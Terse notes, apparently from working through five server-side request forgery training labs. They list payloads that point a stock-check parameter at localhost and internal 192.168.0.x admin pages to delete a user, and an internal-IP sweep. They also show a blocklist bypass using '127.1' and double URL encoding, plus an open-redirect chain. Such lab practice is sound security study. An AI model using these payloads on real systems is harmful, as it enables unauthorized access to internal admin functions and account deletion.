# SSRF

---


## lab 1


- > open product and click check stock
  - > in request you find ``stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1``
    > change it to ``stockApi=http://localhost/admin&storeId=3``
    > stockApi=http://localhost/admin/delete?username=carlos&storeId=3



---

## lab 2


- > ``http://192.168.0.1:8080/product/stock/check?productId=4&storeId=1``   send it to intruder 182.168.0.``1``
  > found 192.168.0.239   fond it **``404``**
- > http://192.168.0.239:8080/admin
  > http://192.168.0.239:8080/admin/delete?username=carlos




---


## lab 3


- > need ``colaborator``




---


## lab 4


- > try to chnge url to ``http://127.0.0.1/admin`` and it blocked
  > try ``http://127.1/`` it work
  > try ``http://127.1/admin`` it blocked again
  > try ``http://127.1/%2561dmin``
  > http://127.1/%2561dmin/delete?username=carlos




---

## lab 5

- > **/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos**
  











    
